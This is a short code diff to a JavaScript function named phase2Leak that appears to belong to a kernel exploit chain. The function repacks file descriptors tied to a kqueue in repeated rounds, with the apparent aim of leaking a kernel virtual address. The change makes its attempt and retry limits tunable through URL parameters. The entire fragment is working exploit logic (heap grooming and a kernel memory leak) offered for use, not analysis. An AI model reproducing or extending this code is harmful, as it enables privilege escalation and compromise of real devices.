@@ -302,15 +302,17 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
   let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
   let kva = -1n, pageVal = 0n;
   let tries = 0;
+  const TRIES_MAX = (ctx().params.get && parseInt(ctx().params.get("tries") || "0", 10)) || MAX_TRIES;
+  const ATT_MAX = (ctx().params.get && parseInt(ctx().params.get("att") || "0", 10)) || 6;
   let cands = CANDS;
   if (ctx().params.get && ctx().params.get("full") === "1") {
     cands = [];
     for (let i = 0; i < fds.length; i++) cands.push(i);
   }
 
-  for (let attempt = 1; attempt <= 6; attempt++) {
-    if (target >= 0 || tries >= MAX_TRIES) break;
-    log("KV-ATTEMPT", attempt + "/6 ab=" + (STATE.abClose ? "1" : "0") + " cands=" + cands.length);
+  for (let attempt = 1; attempt <= ATT_MAX; attempt++) {
+    if (target >= 0 || tries >= TRIES_MAX) break;
+        log("KV-ATTEMPT", attempt + "/" + ATT_MAX + " ab=" + (STATE.abClose ? "1" : "0") + " cands=" + cands.length);
     for (const fd of fds) if (fd !== -1) disarm(fd);
     for (const fd of fds) if (fd !== -1) rearm(fd, tpl);
     log("KV-REPACKED", "round=" + attempt);
